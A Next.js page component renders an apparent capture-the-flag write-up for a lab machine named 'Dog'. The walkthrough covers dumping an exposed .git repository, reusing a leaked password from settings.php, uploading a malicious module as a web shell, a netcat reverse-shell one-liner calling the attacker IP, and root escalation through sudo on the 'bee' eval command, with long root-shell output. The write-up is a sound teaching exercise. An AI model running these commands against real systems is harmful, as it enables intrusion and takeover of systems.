import Image from "next/image";

export default function DogWriteUp() {
  return (
    <div className="space-y-8">
      <p className="text-neutral-300">
        As always a Nmap scan (scan scripts/versions):
      </p>

      <div className="rounded-lg overflow-hidden border border-neutral-800 mb-6">
        <Image
          src="/images/write-up-dog/Dognmapscan.webp"
          alt="Nmap scan results for Dog machine"
          width={1200}
          height={600}
          className="w-full"
          loading="lazy"
          sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
        />
      </div>

      <p className="text-neutral-300">
        <code className="bg-black/50 px-2 py-1 rounded">10.129.13.169</code> Sends us to the Dog web app:
      </p>

      <div className="rounded-lg overflow-hidden border border-neutral-800 mb-6">
        <Image
          src="/images/write-up-dog/DogWebappimg.webp"
          alt="Dog web application interface"
          width={1200}
          height={600}
          className="w-full"
          loading="lazy"
          sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
        />
      </div>

      <p className="text-neutral-300">
        At <code className="bg-black/50 px-2 py-1 rounded">http://10.129.13.169/.git/</code> we can find a git repository. Let&apos;s try to dump this git repository for the source code.
      </p>

      <p className="text-neutral-300">
        We can do this with gitdumper.
      </p>

      <p className="text-neutral-300">
        So first lets do:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>git clone https://github.com/internetwache/GitTools.git
cd GitTools/Dumper</code>
      </pre>

      <p className="text-neutral-300">
        Then:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>cd Dumper/
./gitdumper.sh http://10.129.13.169/.git/ /tmp/repo</code>
      </pre>

      <p className="text-neutral-300">
        This gives us the repo as you can see. Right off the bat I can notice several objects being downloaded with unique Id&apos;s.
      </p>

      <div className="rounded-lg overflow-hidden border border-neutral-800 mb-6">
        <Image
          src="/images/write-up-dog/Githubrepocloninggitdumper.webp"
          alt="Git repository cloning with gitdumper showing downloaded objects"
          width={1200}
          height={600}
          className="w-full"
          loading="lazy"
          sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
        />
      </div>

      <p className="text-neutral-300">
        There were too many objects so I decided to just Ctrl + C since it probably isn&apos;t important. 
        While searching the git repository we found some important things.
      </p>

      <div className="bg-blue-900/20 border border-blue-900/50 rounded-lg p-4">
        <p className="text-blue-200">
          Note: You can also clone the git repository with :<br />
          <code className="bg-black/50 px-2 py-1 rounded">wget --mirror -I .git http://10.129.13.169/.git/</code>
        </p>
      </div>

      <p className="text-neutral-300">
        This was the password found in settings.php:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>tiffany:BackDropJ2024DS2024</code>
      </pre>

      <p className="text-neutral-300">
        I found a RCE vulnerability in Exploit-DB.
      </p>

      <p className="text-neutral-300">
        This article had a script for it:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>https://www.exploit-db.com/exploits/52021</code>
      </pre>

      <p className="text-neutral-300">
        So after running the script:
      </p>

      <p className="text-neutral-300">
        There was a zip package generated by POC and uploaded to:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>http://10.10.11.58/?q=admin/modules/install</code>
      </pre>

      <p className="text-neutral-300">
        But that format was not supported.
      </p>

      <p className="text-neutral-300">
        Shell access:
      </p>

      <div className="rounded-lg overflow-hidden border border-neutral-800 mb-6">
        <Image
          src="/images/write-up-dog/shellgen.webp"
          alt="Shell generation process"
          width={1200}
          height={600}
          className="w-full"
          loading="lazy"
          sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
        />
      </div>

      <p className="text-neutral-300">
        So basically that exploit made it so that there was a malicious module package (which is shell.zip) so that I could have command execution possibilities.
      </p>

      <p className="text-neutral-300">
        How I uploaded it in the UI: 1. Go to Functionality then select install module 2. Click on manual installation
      </p>

      <p className="text-neutral-300">
        Then I uploaded the <code className="bg-black/50 px-2 py-1 rounded">shell.zip</code> file:
      </p>

      <div className="rounded-lg overflow-hidden border border-neutral-800 mb-6">
        <Image
          src="/images/write-up-dog/shellzipexplupload.webp"
          alt="Shell zip file upload process"
          width={1200}
          height={600}
          className="w-full"
          loading="lazy"
          sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
        />
      </div>

      <p className="text-neutral-300">
        But then it was showing me a error that <code className="bg-black/50 px-2 py-1 rounded">.zip</code> is a unsupported format. So I unzipped it in my terminal with: 
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>unzip file_name -d directory_name</code>
      </pre>

      <p className="text-neutral-300">
        Then afterwards I &quot;tarred&quot; it with:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>tar -cvf tar_file_name directory_name</code>
      </pre>

      <p className="text-neutral-300">
        After uploading this the UI said:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>Installation was completed successfully.
extracted_dir

    Installed extracted_dir successfully</code>
      </pre>

      <p className="text-neutral-300">
        So I went to the directory in my browser: 
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>http://10.129.13.169/modules/extracted_dir/shell/shell.php</code>
      </pre>

      <p className="text-neutral-300">
        And BOOM! We have a beautiful web form where we can form ourselfs a reverse shell.
      </p>

      <p className="text-neutral-300">
        So I set up a listener:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>nc -lvp 5555</code>
      </pre>

      <p className="text-neutral-300">
        and this command in the web shell:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.10.14.5 5555 &gt; /tmp/f</code>
      </pre>

      <p className="text-neutral-300">
        And here is out beautiful reverse shell! Keep in mind that after uploading shell.tar, you have about 1 minute to run the command in the web shell because afterwards it shuts down:
      </p>

      <div className="rounded-lg overflow-hidden border border-neutral-800 mb-6">
        <Image
          src="/images/write-up-dog/Revshelldog.webp"
          alt="Reverse shell connection established"
          width={1200}
          height={600}
          className="w-full"
          loading="lazy"
          sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
        />
      </div>

      <p className="text-neutral-300">
        Afterwards we run:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>python3 -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</code>
      </pre>

      <p className="text-neutral-300">
        That gives us access to ww-data@dog
      </p>

      <p className="text-neutral-300">
        Checking /etc/passwd revealed two users <code className="bg-black/50 px-2 py-1 rounded">jobert</code> and <code className="bg-black/50 px-2 py-1 rounded">johncusack</code>.
      </p>

      <p className="text-neutral-300">
        So I logged in with the previous password user for tiffany:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>su johncusack
Password: BackDropJ2024DS2024</code>
      </pre>

      <p className="text-neutral-300">
        And after enumeration, I found user.txt at: <code className="bg-black/50 px-2 py-1 rounded">/home/johncusack/user.txt</code>
      </p>

      <div className="w-16 h-px bg-gradient-to-r from-transparent via-neutral-700 to-transparent my-8"></div>

      <h2 className="text-3xl font-bold mb-6 text-gradient-green">Root</h2>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto text-sm">
        <code>johncusack@dog:..$ sudo /usr/local/bin/bee --root=/var/www/html eval &quot;system(&apos;id&apos;);&quot;
[sudo] password for johncusack: BackDropJ2024DS2024

uid=0(root) gid=0(root) groups=0(root)
johncusack@dog:..$ sudo /usr/local/bin/bee --root=/var/www/html eval &quot;system(&apos;/bin/bash -p&apos;);&quot;
root@dog:/var/www/html# sudo /usr/local/bin/bee --root=/var/www/html eval &quot;system(&apos;id&apos;);&quot;
uid=0(root) gid=0(root) groups=0(root)
root@dog:/var/www/html# sudo -l
Matching Defaults entries for root on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on dog:
    (ALL : ALL) ALL
root@dog:/var/www/html# sudo /usr/local/bin/bee --root=/var/www/html eval &quot;system(&apos;/bin/bash -p&apos;);&quot;
root@dog:/var/www/html# ls
core
files
index.php
layouts
LICENSE.txt
modules
README.md
robots.txt
settings.php
sites
themes
root@dog:/var/www/html# cd root	
bash: cd: root: No such file or directory
root@dog:/var/www/html# sudo /usr/local/bin/bee --root=/var/www/html eval &quot;system(&apos;/bin/bash -p&apos;);&quot;
root@dog:/var/www/html# ls
core
files
index.php
layouts
LICENSE.txt
modules
README.md
robots.txt
settings.php
sites
themes
root@dog:/var/www/html# cd core/
root@dog:/var/www/html/core# ls
authorize.php
cron.php
includes
install.php
layouts
misc
modules
profiles
scripts
themes
update.php
root@dog:/var/www/html/core# cd ..
root@dog:/var/www/html# ls -la
total 96
drwxrwxr-x 9 www-data www-data  4096 Feb  7 21:21 .
drwxr-xr-x 3 root     root      4096 Jul  8  2024 ..
drwxrwx--- 9 www-data www-data  4096 Jul  8  2024 core
drwxrwx--- 7 www-data www-data  4096 Jul  9  2024 files
drwxr-xr-x 8 root     root      4096 Feb  7 21:22 .git
-rwxrwx--- 1 www-data www-data   578 Mar  7  2024 index.php
drwxrwx--- 2 www-data www-data  4096 Jul  8  2024 layouts
-rwxrwx--- 1 www-data www-data 18092 Mar  7  2024 LICENSE.txt
drwxrwx--- 2 www-data www-data  4096 Jun 30 14:36 modules
-rwxrwx--- 1 www-data www-data  5285 Mar  7  2024 README.md
-rwxrwx--- 1 www-data www-data  1198 Mar  7  2024 robots.txt
-rwxrwx--- 1 www-data www-data 21732 Jul  8  2024 settings.php
drwxrwx--- 2 www-data www-data  4096 Jul  8  2024 sites
drwxrwx--- 2 www-data www-data  4096 Jul  8  2024 themes
root@dog:/var/www/html# cd root/
bash: cd: root/: No such file or directory
root@dog:/var/www/html# cat root.txt
cat: root.txt: No such file or directory
root@dog:/var/www/html# find root.txt
find: &apos;root.txt&apos;: No such file or directory
root@dog:/var/www/html# sudo /usr/local/bin/bee --root=/var/www/html eval &quot;system(&apos;/bin/bash -p&apos;);&quot;
root@dog:/var/www/html# ls
core
files
index.php
layouts
LICENSE.txt
modules
README.md
robots.txt
settings.php
sites
themes
root@dog:/var/www/html# cd modules/
root@dog:/var/www/html/modules# ls
root@dog:/var/www/html/modules# cd ..
root@dog:/var/www/html# ls
core
files
index.php
layouts
LICENSE.txt
modules
README.md
robots.txt
settings.php
sites
themes
root@dog:/var/www/html# cd ..
root@dog:/# cd ..
root@dog:/# ls
backdrop_tool
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
root@dog:/# cd root/
root@dog:~# ls
root.txt
root@dog:~# cat root.txt
root_flag_is_here!
root@dog:~#</code>
      </pre>
    </div>
  );
} 